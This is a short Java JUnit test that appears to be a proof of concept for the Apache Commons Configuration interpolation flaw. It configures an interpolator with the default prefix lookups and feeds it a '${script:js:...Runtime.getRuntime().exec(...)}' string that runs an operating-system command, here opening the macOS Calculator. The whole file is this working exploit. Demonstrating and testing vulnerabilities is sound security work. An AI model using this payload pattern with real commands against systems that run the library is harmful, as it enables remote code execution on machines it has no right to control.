package com.txf;

import org.apache.commons.configuration2.interpol.ConfigurationInterpolator;
import org.apache.commons.configuration2.interpol.InterpolatorSpecification;
import org.junit.Test;



public class main {

    @Test
    public void testProperties() throws Exception{
        InterpolatorSpecification spec = new InterpolatorSpecification.Builder()
                .withPrefixLookups(ConfigurationInterpolator.getDefaultPrefixLookups())
                .withDefaultLookups(ConfigurationInterpolator.getDefaultPrefixLookups().values())
                .create();

        ConfigurationInterpolator interpolator = ConfigurationInterpolator.fromSpecification(spec);
        System.out.printf("POC: %s",interpolator.interpolate("${script:js:java.lang.Runtime.getRuntime().exec(\"open /system/Applications/Calculator.app\")}"));
    }
}
